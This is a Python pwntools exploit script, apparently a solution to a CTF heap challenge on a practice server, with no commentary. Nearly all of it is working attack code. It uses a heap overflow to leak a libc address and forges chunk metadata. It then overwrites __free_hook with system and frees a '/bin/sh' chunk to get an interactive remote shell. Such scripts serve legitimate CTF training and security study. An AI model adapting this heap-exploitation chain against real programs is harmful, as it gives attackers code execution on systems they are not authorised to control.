from pwn import *
context.log_level = 'debug'

elf = ELF("./pwn")
#p = elf.process()

libc = ELF("./libc-2.23.so")
p = remote("node2.buuoj.cn.wetolink.com", 28233)
def debug():
    gdb.attach(p)
    p.interactive()

def addc(name):
	p.sendlineafter("choice:", '1')
	p.sendlineafter("name:", name)
def adds(cname, name):
	p.sendlineafter("choice:", '2')
	p.sendlineafter("into:", cname)
	p.sendlineafter("name:", name)
def addt(sname, size, text):
	p.sendlineafter("choice:", '3')
	p.sendlineafter("into:", sname)
	p.sendlineafter("write:", str(size))
	p.sendafter("Text:", text)
def freec(name):
	p.sendlineafter("choice:", '4')
	p.sendlineafter("name:", name)
def frees(name):
	p.sendlineafter("choice:", '5')
	p.sendlineafter("name:", name)
def freet(name):
	p.sendlineafter("choice:", '6')
	p.sendlineafter("name:", name)
def show():
	p.sendlineafter("choice:", '7')
def edit(sname, text):
	p.sendlineafter("choice:", '8')	
	p.sendlineafter("):", 'Text')
	p.sendlineafter("name:", sname)
	p.sendafter("Text:", text)

def exp():
	p.sendlineafter("create: ", 'aaa')
	addc('a')	
	adds('a', 'a')
	addc('b')
	addc('c')
	freec('b')
	addt('a', 0x10, 'a'*0x20)	
	show()
	p.recvuntil("Text:")
	libc_base  = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3c4b78
	malloc_hook = libc_base + libc.sym['__malloc_hook'] - 0x23
	free_hook = libc_base + libc.sym['__free_hook']	
	log.success("libc_base == > " + hex(libc_base))
	edit('a', 'a'*0x10 + p64(0)+p64(0x91)+p64(libc_base+0x3c4b78)+p64(libc_base+0x3c4b78)+'\x00'*0x70+p64(0x90)+p64(0x90)+p64(0x63))		
	adds('a', '/bin/sh')
	addt('/bin/sh', 0x20, 'b')
	adds('a', 'c')
	addt('c', 0x20, 'c')
	adds('a', 'd')
	addt('d', 0x60, 'd')
	edit('c', 'a'*0x20 + p64(0)+p64(0x41)+p64(0x64)+p64(0)*3+p64(free_hook))	
	edit('d', p64(libc_base+libc.sym['system']))	
	frees('/bin/sh')
	p.interactive()
if __name__ == '__main__':
	exp()
